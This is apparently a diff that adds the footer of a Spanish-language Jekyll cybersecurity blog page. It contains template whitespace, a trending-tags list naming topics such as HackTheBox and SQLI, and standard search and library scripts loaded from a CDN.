+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+
+
+  <div id="access-tags">
+    <div class="panel-heading">Trending Tags</div>
+    <div class="d-flex flex-wrap mt-3 mb-1 mr-3">
+
+    
+      
+      <a class="post-tag" href="/tags/2022/">2022</a>
+    
+      
+      <a class="post-tag" href="/tags/t3sla/">T3sla</a>
+    
+      
+      <a class="post-tag" href="/tags/ciberseguridad/">Ciberseguridad</a>
+    
+      
+      <a class="post-tag" href="/tags/hackthebox/">HackTheBox</a>
+    
+      
+      <a class="post-tag" href="/tags/holamundo/">HolaMundo</a>
+    
+      
+      <a class="post-tag" href="/tags/localportforwarding/">LocalPortForwarding</a>
+    
+      
+      <a class="post-tag" href="/tags/noob/">NOOB</a>
+    
+      
+      <a class="post-tag" href="/tags/path-hijacking/">PATH-Hijacking</a>
+    
+      
+      <a class="post-tag" href="/tags/snmp/">snmp</a>
+    
+      
+      <a class="post-tag" href="/tags/sqli/">SQLI</a>
+    
+
+    </div>
+  </div>
+
+
+    </div>
+    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
+  </div>
+</div>
+
+
+    </div> <!-- #main-wrapper -->
+
+    
+
+    <div id="mask"></div>
+
+    <a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button">
+      <i class="fas fa-angle-up"></i>
+    </a>
+
+    <!--
+  Jekyll Simple Search loader
+  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
+-->
+
+
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script>
+
+<script>
+SimpleJekyllSearch({
+  searchInput: document.getElementById('search-input'),
+  resultsContainer: document.getElementById('search-results'),
+  json: '/assets/js/data/search.json',
+  searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0">  <a href="{url}">{title}</a>  <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">    {categories}    {tags}  </div>  <p>{snippet}</p></div>',
+  noResultsText: '<p class="mt-5">Oops! No result founds.</p>',
+  templateMiddleware: function(prop, value, template) {
+    if (prop === 'categories') {
+      if (value === '') {
+        return `${value}`;
+      } else {
+        return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
+      }
+    }
+
+    if (prop === 'tags') {
+      if (value === '') {
+        return `${value}`;
+      } else {
+        return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
+      }
+    }
+  }
+});
+</script>
+
+
+    <!--
+  JS selector for site.
+-->
+
+<!-- layout specified -->
+
+
+  
+
+
+
+  <!-- image lazy-loading & popup & clipboard -->
+  
+
+  
+
+
+
+
+
+
+
+  
+    
+
+    
+
+  
+
+
+
+  
+    
+
+    
+
+  
+
+
+
+  
+    
+
+    
+
+  
+
+
+
+
+  <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+
+
+
+
+
+
+  
+    
+
+    
+
+  
+
+
+
+  
+    
+
+    
+
+  
+
+
+
+  
+    
+
+    
+
+  
+
+
+
+  
+    
+
+    
+
+  
+
+
+
+
+  <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script>
+
+
+
+
+
+
+
+
+<script defer src="/assets/js/dist/post.min.js"></script>
+
+
+
+<!-- commons -->
+
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script>
+
+
+
+
+  </body>
+
+</html>
+
